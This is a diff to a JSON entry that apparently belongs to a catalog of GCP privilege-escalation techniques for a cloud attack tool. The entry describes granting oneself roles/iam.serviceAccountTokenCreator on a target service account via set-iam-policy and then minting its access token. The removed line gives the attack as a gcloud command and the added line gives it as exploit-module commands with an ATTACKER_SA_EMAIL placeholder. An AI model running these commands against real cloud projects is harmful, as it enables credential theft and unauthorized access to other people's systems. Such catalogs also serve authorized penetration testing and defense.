@@ -126,7 +126,7 @@
         ],
         "on": "service-account",
         "description": "Set the IAM policy on the target service account. Use set-iam-policy (not add-iam-policy-binding which also needs getIamPolicy) to grant yourself roles/iam.serviceAccountTokenCreator directly on the SA, then generate a token. No actAs required — tokenCreator is a separate mechanism.",
-        "example_command": "gcloud iam service-accounts set-iam-policy {target_sa} policy.json --project={project_id} && gcloud auth print-access-token --impersonate-service-account={target_sa}",
+        "example_command": "modules run exploit_gcp_setiampolicy --service service_account --service-account-email {target_sa} --member serviceAccount:ATTACKER_SA_EMAIL --role roles/iam.serviceAccountTokenCreator && modules run exploit_generate_access_token --target-sa {target_sa} --project-id {project_id}",
         "status": "CONFIRMED",
         "sa_token_theft_without_actas": true
       },
